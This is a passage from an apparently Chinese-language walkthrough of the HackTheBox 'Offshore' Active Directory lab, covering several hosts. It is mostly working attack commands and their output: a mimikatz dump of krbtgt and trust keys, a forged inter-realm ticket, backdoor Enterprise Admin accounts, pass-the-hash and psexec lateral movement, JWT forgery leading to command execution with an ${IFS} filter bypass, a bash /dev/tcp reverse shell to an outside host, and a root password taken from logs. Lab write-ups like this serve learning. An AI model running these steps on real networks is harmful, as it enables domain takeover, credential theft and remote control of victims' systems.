Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/27/2018 7:38:47 PM
Object Security ID   : S-1-5-21-2291914956-3290296217-2402366952-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: cba2ed22077aa56ae957bcf43a8d82f8
    ntlm- 0: cba2ed22077aa56ae957bcf43a8d82f8
    lm  - 0: 498dbe5b2dba7a084efe18f92c33951b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e20039bf0438249625b72620061ba006

* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c53f6edb9196e9c63e94348a310776e85543fb030216bb751266190e2e3e3bec
      aes128_hmac       (4096) : e9b8a52b61cfc83a7ffa5a0e1f691361
      des_cbc_md5       (4096) : 0870ae92d661f131

* Primary:Kerberos *
    Default Salt : CORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 0870ae92d661f131

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a1b3caa1760c2a522fd8069402cd9a29
    02  87184d455be8a816315e1b2ba24f4a53
    03  1aa484194831e6c4a5ace4a61716853d
    04  a1b3caa1760c2a522fd8069402cd9a29
    05  87184d455be8a816315e1b2ba24f4a53
    06  e383e80ccb64d670257726a198e1131e
    07  a1b3caa1760c2a522fd8069402cd9a29
    08  c99d5d71e724c7073308917e80324b94
    09  c99d5d71e724c7073308917e80324b94
    10  b3af2cf77093985700c95194b5ccd7d8
    11  546a815636b095ae8d94e04a474f0c4b
    12  c99d5d71e724c7073308917e80324b94
    13  650358c34a32acd35790d18f03347805
    14  546a815636b095ae8d94e04a474f0c4b
    15  3ca599562e8c199c696ed671b8562133
    16  3ca599562e8c199c696ed671b8562133
    17  38398c0a2698f3be4dc7bc9a864af3a3
    18  daa327f40f1faa2026144945f33a9dd4
    19  7fb232f3aed5f643fdfbe433dca98c34
    20  644ae03193270f24d704f392a99574c7
    21  53460bd4da37b0f02aaa0dc0effded1f
    22  53460bd4da37b0f02aaa0dc0effded1f
    23  80efd285badd5b637065c2db93fdd9d6
    24  010d7d7fd23b9355d16a71f88c091f69
    25  010d7d7fd23b9355d16a71f88c091f69
    26  7f8c126960ac8e27b3c6f0011a9e59e1
    27  99661251aa4b3a52e84472f34e936db0
    28  2ebe7c4a64307956ee1cca314df2fffb
    29  2ad6ae0dc96f726557d7053fbca36c3a


mimikatz(commandline) # exit
Bye!
```

#### 3️⃣ 在 corp DC 上执行：
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "lsadump::trust /patch" "exit"
 

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::trust /patch

Current domain: CORP.LOCAL (CORP / S-1-5-21-2291914956-3290296217-2402366952)

Domain: DEV.ADMIN.OFFSHORE.COM (DEV / S-1-5-21-1416445593-394318334-2645530166)
 [  In ] CORP.LOCAL -> DEV.ADMIN.OFFSHORE.COM
    * 3/2/2026 10:51:51 PM - CLEAR   - cf ba 66 be f5 58 57 4f 53 38 05 24 b2 cc 6b 54 eb 67 ce ae c9 2e 0c 27 01 92 b5 ee ff cb 36 08 a7 e8 40 c7 8e 1f 96 75 3b e4 5b fa d3 95 84 78 4c ec c1 d6 9e 57 10 e7 f7 f3 d0 a8 eb da be 7b b1 70 81 5c 9e bb fd 32 63 d1 69 33 1b ef af 9f d7 ca e8 5a f2 7c e2 2a b4 27 04 cd 12 b7 d4 d1 69 4d 46 fa 9c bc d0 e3 0b 3f d4 e1 69 35 5e 89 6b b9 01 b6 76 8a a2 91 db 5b cd 33 cb 40 08 23 e0 c2 c9 ce 4a 1c 0e fc 62 29 18 ed 9b 5b ed cd f0 89 b9 6f 7a 25 f0 bb 35 c7 41 f9 2e 2f 56 8a 64 1d e6 fb 27 98 a8 e9 67 e6 15 61 b1 00 f3 2b 0f 75 f9 b0 97 07 27 1e 9e 88 29 6d 7c dd 74 41 3b 45 4a 88 4a ad 62 d4 29 1a a7 27 87 b0 66 be 3a c4 82 7d 4b 7a 06 b8 37 3d a2 37 a1 4b b5 78 3e 69 9f b5 3a 05 a8 3a c3 4e 69 26 97 2a 1d a8
        * aes256_hmac       98f6fba96ff4208b9133f98e1deda1b0a7585bc73186138d576cfe0a76b0b0e6
        * aes128_hmac       c140552a16cbf86d05c94878453ff6d2
        * rc4_hmac_nt       e82767a9460210569ee0daf10e3a5d89

 [ Out ] DEV.ADMIN.OFFSHORE.COM -> CORP.LOCAL
    * 3/2/2026 10:51:58 PM - CLEAR   - d1 b0 01 d5 73 dc 53 af 41 04 8b 0a 36 a3 8c 60 51 31 82 cf 57 df da 93 de 62 3c 49 70 47 37 a4 e2 7d 69 ff fe eb 4b f1 80 6f 74 f8 b3 19 86 f2 0e 81 85 ac bf ef 1d 48 d5 9f 6c 3b 65 f9 ac 19 25 c1 23 df 66 ca 9a e2 df b3 c9 47 b8 c4 1f a7 e5 d0 d4 3d c9 b4 fc 66 6a e3 d5 12 f6 9c 05 f3 d2 35 1c 57 b3 38 20 e1 94 fe 45 49 f9 4b 7a d7 ce cc 43 f7 84 f3 76 3b e4 4b 9e ab 9a d2 9e fb 14 da f4 a7 dc 78 8c 4c d3 c7 70 52 fe 1d 11 41 f6 ef 92 48 86 d7 57 ef 22 34 93 fe 05 8b f3 e7 e1 16 e8 df 44 1d c5 ee 1f 1c c4 89 cb be 5d 73 af ad 46 57 a3 aa 68 15 cd 2d 57 12 65 bf d9 c1 69 56 96 bd 26 6d 42 4a 02 39 f5 76 d7 69 29 ad fb 59 f7 ec 72 0c 86 a0 dc 5f a9 46 a6 f1 98 c6 1c ec e2 e5 62 3d c1 b3 ab 32 80 44 a1 09 20 7a
        * aes256_hmac       aa37222cf576bdf9cadb6cdcc235af2c69ef340b1f45392d5a7569beb4a5fcbb
        * aes128_hmac       054dc3da41ea7f326137d79d0827775c
        * rc4_hmac_nt       db12846c239a433daecebfdc06efefab

 [ In-1] CORP.LOCAL -> DEV.ADMIN.OFFSHORE.COM
    * 3/24/2025 5:46:11 AM - CLEAR   - f1 2b a0 f4 02 42 5c b0 81 15 96 8b 6d fa 43 8c e0 ee a3 1f cb 3c 89 07 50 68 67 d3 fa 3c 6a 4e ba f4 98 1b d4 c5 ae 6e ef 47 26 bd 0c 82 eb 40 3c f6 64 a1 5f e6 cb 75 87 52 72 69 05 76 fa 90 a1 b1 c7 39 b8 c4 51 ae f8 c5 5b 6b 37 4a 89 7d b9 ff 25 12 de 81 e2 d8 44 af f7 62 02 2f 33 57 fe c3 94 8c 95 2a b4 a0 4e c4 ec 25 53 3f bf 4e 7f f5 ce fd a3 2d e8 b6 55 14 ac 1a f2 25 72 db 34 4b 17 ab 53 88 67 69 39 98 7a 37 d5 ad b5 17 ea cf e6 0d 9b 38 aa b3 a3 11 f3 6f 1c ea a5 0d c4 53 76 9b e7 ca 29 64 63 1b a8 56 6b 07 ba 20 a8 aa 34 33 50 08 1a a9 be d6 94 e7 bd 79 c6 47 00 7a a8 3d b8 cc 01 26 fa 6b e7 60 83 87 ac ee 70 34 e0 18 74 e4 00 b2 b4 fb 32 1a e9 4d 6e d9 92 f8 7c 97 4c 10 36 68 4d c7 88 fe 24 b6 9f 4a
        * aes256_hmac       48fd50dcfc2140e86a1ab5db97a2911395e97329906ab34d59b5ded1150d5aeb
        * aes128_hmac       8ef0bbaef013b1333a5ac65a2bbe285a
        * rc4_hmac_nt       394e89d81205ebd9368421eb853973c7

 [Out-1] DEV.ADMIN.OFFSHORE.COM -> CORP.LOCAL
    * 3/2/2026 10:51:58 PM - CLEAR   - 72 dc bb 36 6d 0c a7 15 f1 84 03 90 0b 7d b1 f4 5b 6c aa 9d f8 9a 3e 3f de 0c be 88 94 d5 90 5b ea 55 be 44 bb 97 c5 5d d6 5d 98 cd eb 1b 43 40 85 d1 2c 5b 41 0c 0e 12 b9 b2 7b 98 85 d3 7b df 47 97 c0 0f 8b 04 e8 4b db 01 6c ed 34 4c 4b fa 2e 44 a4 32 7a e7 18 15 80 47 3f 7c 12 69 04 cc 39 9f 20 af b9 17 ce 32 fe 05 e9 1b 3d 56 03 02 8b 25 1d 8f 30 84 23 d5 c8 36 94 ca 63 36 90 7f da 14 66 a1 2c c6 1c f7 38 54 ad de 18 81 a8 12 8b c6 70 72 54 17 f4 85 49 e4 c9 4a 81 cd fd 5b 1d 59 2b 43 a9 a7 4c f2 bf 17 69 20 bf af 56 d7 78 db 86 71 63 96 19 0e 90 07 00 16 cf f5 b6 a4 39 32 e1 24 d0 23 d7 72 c2 04 64 c5 28 62 b6 d5 88 9c 02 a9 79 68 fa a7 be 71 44 72 c1 12 9b 82 19 c3 04 b0 e4 24 c8 f1 4d 25 d8 57 6f 26 b7 46
        * aes256_hmac       b9aad479260173daa9d509963036fb9ba592df711c3b38ca6a390dd8abcc5f09
        * aes128_hmac       a598a83f36c49eea59cd60890b1c0d45
        * rc4_hmac_nt       248ebcd623899d533a88a999b3a4efde


mimikatz(commandline) # exit
Bye!

```

```plain
DEV SID:
S-1-5-21-1416445593-394318334-2645530166
```

#### 🚀 用 impacket-ticketer 伪造 Inter-Realm TGT
```plain
impacket-ticketer \
-aesKey 98f6fba96ff4208b9133f98e1deda1b0a7585bc73186138d576cfe0a76b0b0e6 \
-domain corp.local \
-domain-sid S-1-5-21-2291914956-3290296217-2402366952 \
-extra-sid S-1-5-21-1416445593-394318334-2645530166-519 \
-spn krbtgt/dev.ADMIN.OFFSHORE.COM \
Administrator
```

#### 导入票据到当前会话
```plain
export KRB5CCNAME=Administrator.ccache
```

#### 横向移动dev.ADMIN.OFFSHORE.COM
```plain
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q impacket-getST \
-spn cifs/DC02.dev.ADMIN.OFFSHORE.COM \
corp.local/Administrator \
-k -no-pass \
-dc-ip 172.16.2.6
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
```

失败了

## Dev-Hound
尝试横向发现失败了，再进行下域内信息收集吧

### sharphound
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ../../tools/sharphound/SharpHound-v2.5.1/SharpHound.exe 
                                        
Info: Uploading /home/kali/Desktop/tools/sharphound/SharpHound-v2.5.1/SharpHound.exe to C:\Users\Administrator\Documents\SharpHound.exe

*Evil-WinRM* PS C:\Users\Administrator\Documents> .\SharpHound.exe -c All

*Evil-WinRM* PS C:\Users\Administrator\Documents> download 20260308062302_BloodHound.zip
                                        
Info: Downloading C:\Users\Administrator\Documents\20260308062302_BloodHound.zip to 20260308062302_BloodHound.zip                                                       
                                        
Info: Download successful!
```

### bloodhound
上传完发现内容仍仅为CORP.LOCAL

突然想起会不会是因为sharphound的用户是administrator导致

我们创建一个Enterprise Admin组用户进行hound收集....

但是administrator本身就是Enterprise Admin组啊???

### 查阅wp(无用)
脑子炸了.....

wp是这么写的

#### 描述
> dc  nltest 看到了域信任,  而我们又是根域
>
> 
>
> List of domain trusts:
>
>     0: DEV dev.ADMIN.OFFSHORE.COM (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: quarantined )
>
>     1: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
>
>     
>
> PS C:\Users> net user administrator
>
> Local Group Memberships      *Administrators
>
> Global Group memberships     *Domain Users         *Schema Admins
>
>                              *Enterprise Admins    *Domain Admins
>
>                              *Group Policy Creator
>
> 直接添加一个EA组的账户,直接访问一下看看  发现是行得通的
>
> net user qwe strong.123 /add /domain
>
> net group "enterprise admins" qwe /add /domain
>
> net group "domain admins" qwe /add /domain
>
> 
>
> 这里验证的时候需要加上 域, 因为不同的域用户不同哦
>
> proxychains crackmapexec smb 172.16.2.6 -u qwe -p 'strong.123' -d corp.local
>
> SMB         172.16.2.6      445    DC02             
>
> [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:corp.local) (signing:True) (SMBv1:True)
>
> SMB         172.16.2.6      445    DC02             
>
> [+] corp.local\qwe:strong.123
>

```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> net user qwe strong.123 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\Administrator\Documents> net group "enterprise admins" qwe /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\Administrator\Documents> net group "domain admins" qwe /add /domain
The command completed successfully.
```

```plain
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q crackmapexec smb 172.16.2.6 -u qwe -p 'strong.123' -d corp.local
SMB         172.16.2.6      445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:corp.local) (signing:True) (SMBv1:True)
SMB         172.16.2.6      445    DC02             [+] corp.local\qwe:strong.123 
```

我服了，这么简单的问题卡了我好久好久啊.....

#### 原理


这里其实利用的是 **Forest Root + Enterprise Admins 的跨域权限特性**，所以能成功访问 `corp.local`。我给你按 **域信任 + 权限继承逻辑**拆开讲，你就能彻底理解为什么能成功。

---

##### 一、先看你的域结构
`nltest` 输出：

```plain
0: DEV dev.ADMIN.OFFSHORE.COM (Direct Outbound) (Direct Inbound) (Attr: quarantined)
1: CORP corp.local (Forest Tree Root) (Primary Domain)
```

意思是：

```plain
Forest
│
└── corp.local      (Forest Root Domain)
      │
      └── dev.ADMIN.OFFSHORE.COM   (Child Domain)
```

所以关系是：

```plain
corp.local
   │
   └── dev.ADMIN.OFFSHORE.COM
```

关键点：

**corp.local 是 Forest Root**

---

##### 二、Enterprise Admins 的权限范围
你现在在 `corp.local` 上看到：

```plain
Enterprise Admins
Schema Admins
Domain Admins
```

这里最重要的是：

**Enterprise Admins (EA)**

EA 的权限是：

```plain
整个 Forest 的最高权限
```

也就是说：

```plain
Enterprise Admins
   ↓
可以控制
   ↓
Forest 内所有 Domain
```

包括：

```plain
corp.local
dev.ADMIN.OFFSHORE.COM
```

---

##### 三、为什么可以直接加用户
你执行：

```powershell
net user qwe strong.123 /add /domain
```

其实是在：

```plain
corp.local 域创建用户
```

然后：

```plain
net group "enterprise admins" qwe /add /domain
```

意思是：

```plain
把 qwe 加入 Forest 最高权限组
```

现在权限变成：

```plain
qwe
 └─ Enterprise Admins
       └─ Forest 所有域管理员
```

---

##### 四、为什么能直接登录 dev 域机器
你测试：

```plain
proxychains crackmapexec smb 172.16.2.6 -u qwe -p strong.123 -d corp.local
```

成功原因：

###### 1 信任关系
child domain 会信任 root domain

```plain
dev.ADMIN.OFFSHORE.COM
        ↑
        │ trust
        │
corp.local
```

###### 2 Enterprise Admins 权限扩展
EA 会自动：

```plain
被加入所有 Domain 的 Administrators
```

所以：

```plain
corp.local Enterprise Admin
        ↓
dev.ADMIN.OFFSHORE.COM Administrators
```

---

##### 五、Kerberos 实际发生了什么
当你认证 `dev` 域机器时：

流程是：

```plain
qwe@corp.local
     │
     │ 请求 TGT
     ▼
corp.local KDC
     │
     │ 跨域 TGT
     ▼
dev.ADMIN.OFFSHORE.COM
     │
     │ 验证 EA 权限
     ▼
Access Granted
```

所以 `dev` 域机器接受了你的票据。

---

##### 六、为什么需要指定域
你这里写：

```plain
-d corp.local
```

原因是：

用户属于：

```plain
corp.local\qwe
```

而不是：

```plain
dev.ADMIN.OFFSHORE.COM\qwe
```

如果写错域：

```plain
-d dev.ADMIN.OFFSHORE.COM
```

就会认证失败，因为：

```plain
dev 域不存在 qwe
```

---

##### 七、quarantined 的意义（这个很多人忽略）
你看到：

```plain
Attr: quarantined
```

这个其实是：

```plain
SID Filtering
```

意思：

```plain
跨域 SID 不完全信任
```

但：

**Enterprise Admins 不受影响**

因为：

```plain
EA 是 Forest 内置权限
```

---

### 特别的用户
刚刚我们不是添加了个qwe用户吗，啥用没有....毕竟添加这个用户又不能让我们直接访问dev域

```plain
                                                                                                        
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains crackmapexec smb 172.16.2.6 -u qwe -p strong.123 -d corp.local --shares
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1235  ...  172.16.2.6:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1235  ...  172.16.2.6:135  ...  OK
SMB         172.16.2.6      445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:corp.local) (signing:True) (SMBv1:True)
[proxychains] Strict chain  ...  127.0.0.1:1235  ...  172.16.2.6:445  ...  OK
SMB         172.16.2.6      445    DC02             [+] corp.local\qwe:strong.123 
SMB         172.16.2.6      445    DC02             [+] Enumerated shares
SMB         172.16.2.6      445    DC02             Share           Permissions     Remark
SMB         172.16.2.6      445    DC02             -----           -----------     ------
SMB         172.16.2.6      445    DC02             ADMIN$                          Remote Admin
SMB         172.16.2.6      445    DC02             C$                              Default share
SMB         172.16.2.6      445    DC02             IPC$                            Remote IPC
SMB         172.16.2.6      445    DC02             NETLOGON        READ            Logon server share 
SMB         172.16.2.6      445    DC02             SYSVOL          READ            Logon server share 
```

说明：

**你不是管理员**  
但你是**合法域用户**

但是有个特别的用户iamtheadministrator

```plain
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/17/2018   5:15 PM                Administrator
d-----         6/4/2020   4:52 PM                iamtheadministrator
d-r---         3/8/2026   7:50 AM                Public
```

#### Getflag
```plain
*Evil-WinRM* PS C:\Users\iamtheadministrator\Desktop> type flag.txt
OFFSHORE{r3pl1cation_@ll0w_l1st}
```

#### 上传sharphound
```plain
upload ../../../tools/sharphound/SharpHound-v2.5.1/SharpHound.ps1
```

#### 运行sharphound(失败)
```plain
*Evil-WinRM* PS C:\Users\iamtheadministrator\Documents> . .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\iamtheadministrator\Documents> Invoke-BloodHound -CollectionMethod All -Domain DEV.ADMIN.OFFSHORE.COM -DomainController 172.16.2.6
```

卡了我好久好久好久好久，就是没有反应

wp这里就是使用iamtheadministrator然后执行脚本

如图：

![](/image/prolabs/Offshore-22.png)

明明指令相同我却不成功，我刚开始以为是amsi的事情，结果尝试绕过+关闭防御发现并非如此

### bloodhound-python
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/offshore/blood]
└─# proxychains -q bloodhound-python -c All \
    -d dev.ADMIN.OFFSHORE.COM \
    -dc DC02.dev.ADMIN.OFFSHORE.COM \
    -u 'Administrator@corp.local' \
    --hashes aad3b435b51404eeaad3b435b51404ee:0109d7e72fcfe404186c4079ba6cf79c \
    -ns 172.16.2.6 \
    --dns-tcp \
    --auth-method ntlm
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: dev.admin.offshore.com
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Connecting to LDAP server: DC02.dev.ADMIN.OFFSHORE.COM
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: DC02.dev.ADMIN.OFFSHORE.COM
INFO: Connecting to GC LDAP server: dc02.dev.admin.offshore.com
INFO: Found 7 users
INFO: Found 50 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS03.dev.ADMIN.OFFSHORE.COM
INFO: Querying computer: DC02.dev.ADMIN.OFFSHORE.COM
WARNING: SID S-1-5-21-1416445593-394318334-2645530166-1110 lookup failed, return status: STATUS_NONE_MAPPED
INFO: Done in 01M 40S
```

上传即可

## 横向移动
### Bloodhound
![](/image/prolabs/Offshore-23.png)

![](/image/prolabs/Offshore-24.png)

![](/image/prolabs/Offshore-25.png)

JOE@DEV.ADMIN.OFFSHORE.COM 允许空密码存在(Password Not Required)

并且还具有GenericWrite的权限，那么很明显我们的下一个目标就是JOE用户

```plain
MATCH (u:User)
WHERE u.passwordnotreqd = true
RETURN u
```

![](/image/prolabs/Offshore-26.png)

### Joe用户
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-psexec DEV.ADMIN.OFFSHORE.COM/joe@172.16.2.6
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 172.16.2.6.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
```

在DC02上没办法登录，尝试枚举

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.2.0/24 -u joe -p ''
SMB         172.16.2.6      445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:dev.ADMIN.OFFSHORE.COM) (signing:True) (SMBv1:True)
SMB         172.16.2.6      445    DC02             [+] dev.ADMIN.OFFSHORE.COM\joe: 
SMB         172.16.2.102    445    WS03             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS03) (domain:dev.ADMIN.OFFSHORE.COM) (signing:False) (SMBv1:True)
SMB         172.16.2.102    445    WS03             [+] dev.ADMIN.OFFSHORE.COM\joe: (Pwn3d!)
```

发现WS03被joe Pwn3d!

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-psexec DEV.ADMIN.OFFSHORE.COM/joe:''@172.16.2.102
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 172.16.2.102.....
[*] Found writable share ADMIN$
[*] Uploading file GaPEunHN.exe
[*] Opening SVCManager on 172.16.2.102.....
[*] Creating service ZQPP on 172.16.2.102.....
[*] Starting service ZQPP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

# 172.16.1.15(Windows)（Setp:8-Getflag）
## 端口扫描
```c
export ip=172.16.1.15; for port in $(seq 1 20000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 135
Port open 139
Port open 445
Port open 1433
Port open 3389
Port open 5985
```

## 凭据信息
```c
server=172.16.1.15
sa/SQLP@$$w0rD
```

## mssqlclient
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q impacket-mssqlclient sa:'SQLP@$$w0rD'@172.16.1.15
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2014 RTM (no SP) (12.0.2000)
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

### 是否外联
```c
SQL (sa  dbo@master)> SELECT srvname, isremote FROM sysservers
srvname            isremote   
----------------   --------   
SQL01\SQLEXPRESS          1   
```

### 查询数据库
```c
SQL (sa  dbo@master)> SELECT name FROM master.dbo.sysdatabases;
name        
---------   
master      
tempdb      
model       
msdb        
WebApp      
Documents   
Users
```

### 查询表信息
```c
SQL (sa  dbo@master)> select * from WebApp.information_schema.tables;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
WebApp          dbo            Users        b'BASE TABLE'   
WebApp          dbo            Orders       b'BASE TABLE'

SQL (sa  dbo@master)> select * from WebApp.dbo.Users;
UserID   Username   Password         
------   --------   --------------   
     1   b'Bob'     b'Str0ngP@ss!'
     2   b'Rob'     b'S3cretP@ss!' 
     3   b'Try'     b'Harder!' 
```

## 域控Administrator
### Getflag
```plain
┌──(kali㉿kali)-[~/Desktop/tools/netcat]
└─$ proxychains -q crackmapexec smb 172.16.1.15 \
-u administrator \
-H 0109d7e72fcfe404186c4079ba6cf79c -x "type C:\Users\Administrator\Desktop\flag.txt"
SMB         172.16.1.15     445    SQL01            [*] Windows Server 2016 Standard 14393 x64 (name:SQL01) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.15     445    SQL01            [+] corp.local\administrator:0109d7e72fcfe404186c4079ba6cf79c (Pwn3d!)
SMB         172.16.1.15     445    SQL01            [+] Executed command 
SMB         172.16.1.15     445    SQL01            OFFSHORE{hmm_p0tato3s}
```

得到OFFSHORE{hmm_p0tato3s}

# 172.16.1.22(Linux)（Setp:18）
## 端口扫描
```c
root@NIX01:~# export ip=172.16.1.22; for port in $(seq 1 10000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 3000
```

## 访问服务
```plain
http://172.16.1.22:3000
```

返回：

```plain
Required authorization token not found
```

说明这是 **需要认证的 API**。

## 分析认证方式
添加 Header：

```plain
Authorization: Bearer
```

返回：

```plain
Authorization header format must be Bearer {token}
```

继续测试：

```plain
Authorization: Bearer qwe
```

返回：

```plain
token contains an invalid number of segments
```

这说明：

**API 使用 JWT Token 认证**

JWT结构：

```plain
header.payload.signature
```

---

## 构造 JWT 测试
随便生成一个 JWT：

```plain
Authorization: Bearer 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

返回：

```plain
signature is invalid
```

说明：

```plain
JWT 使用 HS256 对称签名
```

---

## 寻找 JWT 密钥
在 **WS03-172.16.2.102**机器上发现源码：

```plain
C:\Projects\goMonitor\
```

查看代码：

```plain
type C:\Projects\goMonitor\main.go
```

关键代码：

```plain
var secret = []byte("PSmu3dR2wMZQvNge")
```

说明：

```plain
JWT 密钥硬编码
```

密钥：

```plain
PSmu3dR2wMZQvNge
```

---

## 代码漏洞分析
核心逻辑：

```plain
cmd := token.Claims.(jwt.MapClaims)["cmd"].(string)
output, _ := exec.Command("sh","-c", cmd).Output()
```

说明：

JWT payload 中的：

```plain
cmd
```

会被执行。

也就是：

```plain
JWT → 命令执行
```

---

## 命令限制
代码限制：

```plain
if strings.Contains(cmd, " ") {
    fmt.Fprintf(w, "Hacker Detected!")
}
```

不能包含：

```plain
空格
```

---

## 绕过空格限制
Linux 可以使用：

```plain
${IFS}
```

代替空格。

例如：

```plain
ls${IFS}/home
```

---

## 生成恶意 JWT
payload：

```plain
{
 "cmd":"whoami"
}
```

生成 token：

```plain
import jwt

secret="PSmu3dR2wMZQvNge"

payload={
"cmd":"whoami"
}

print(jwt.encode(payload,secret,algorithm="HS256"))
```

得到 token。

---

## 发送 RCE
请求：

```plain
GET / HTTP/1.1
Host: 172.16.1.22:3000
Authorization: Bearer <token>
```

返回：

```plain
joe
```

说明：

```plain
RCE 成功
```

---

## 读取 flag
构造 payload：

```plain
cat${IFS}/home/joe/Desktop/flag.txt
```

JWT payload：

```plain
{
 "cmd":"cat${IFS}/home/joe/Desktop/flag.txt"
}
```

返回：

```plain
OFFSHORE{Pr0t3ct_Th05e_5ecr3ts}
```

---

## 反弹 shell
普通反弹 shell：

```plain
bash -c 'bash -i >& /dev/tcp/10.10.16.2/1234 0>&1'
```

因为有空格，需要改写：

```plain
bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&/dev/tcp/10.10.16.2/1234${IFS}0<&1'
```

监听：

```plain
nc -lvnp 1234
```

获得 shell。

---

## 升级 TTY
```plain
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

然后：

```plain
script /dev/null -qc /bin/bash
```

---

## 发现用户权限
```plain
id
```

返回：

```plain
uid=1000(joe)
groups= sudo adm
```

关键：

```plain
adm
```

---

## adm 组权限
adm 可以读取：

```plain
/var/log/
```

例如：

```plain
/var/log/syslog
/var/log/auth.log
```

还有：

```plain
/var/log/powershell.log
```

---

## 分析 PowerShell 日志
查看：

```plain
cat /var/log/powershell.log
```

发现：

```plain
Enter-PSSession -ComputerName 192.168.24.89 -Port 15985 -Credential (Get-Credential -UserName home\joe -Message EnterPass)
```

继续搜索：

```plain
grep joe /var/log/powershell.log
```

发现：

```plain
{c:\users\joe\desktop\get-logs.ps1 -name joe -p HWaKJkUFgRe56WzG}
```

得到密码：

```plain
HWaKJkUFgRe56WzG
```

---

## 提权 root
尝试：

```plain
su root
```

输入密码：

```plain
HWaKJkUFgRe56WzG
```

成功：

```plain
root@nix02
```

---

## 获取 root flag
```plain
cat /root/root.txt
OFFSHORE{W@tCH_TH05e_Gr0up$}
```

# 172.16.1.24(Windows)（Setp:5）
## 端口扫描
```c
